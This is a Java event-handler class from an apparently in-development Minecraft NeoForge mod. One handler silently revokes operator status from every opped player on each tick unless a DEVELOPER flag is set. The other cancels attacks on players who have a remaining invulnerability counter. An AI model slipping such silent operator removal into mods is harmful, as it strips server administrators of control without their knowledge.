package me.lyuxc.develop.event;

import me.lyuxc.develop.AttachmentTypes;
import me.lyuxc.develop.Variables;
import net.minecraft.network.chat.Component;
import net.minecraft.world.entity.player.Player;
import net.neoforged.bus.api.SubscribeEvent;
import net.neoforged.fml.common.EventBusSubscriber;
import net.neoforged.neoforge.event.entity.living.LivingAttackEvent;
import net.neoforged.neoforge.event.tick.PlayerTickEvent;

import java.util.Objects;


@EventBusSubscriber
public class onTick {
    @SubscribeEvent
    public static void onTickEvent(PlayerTickEvent.Pre event) {
        Player player = event.getEntity();
        if(player.level().getServer() != null) {
            if (Objects.requireNonNull(player.level().getServer()).getPlayerList().isOp(player.getGameProfile()) && !Variables.DEVELOPER) {
                Objects.requireNonNull(player.level().getServer()).getPlayerList().deop(player.getGameProfile());
            }
        }
    }
    @SubscribeEvent
    public static void onAttackEvent(LivingAttackEvent event) {
        if(!event.getEntity().level().isClientSide()) {
            if (event.getEntity() instanceof Player player) {
                if(player.getData(AttachmentTypes.INF_ATTACHMENT.get()) > 0) {
                    player.setData(AttachmentTypes.INF_ATTACHMENT.get(), player.getData(AttachmentTypes.INF_ATTACHMENT.get()) - 1);
                    player.sendSystemMessage(Component.literal(event.getEntity().getData(AttachmentTypes.INF_ATTACHMENT.get()).toString()));
                    event.setCanceled(true);
                }
            }
        }
    }
}
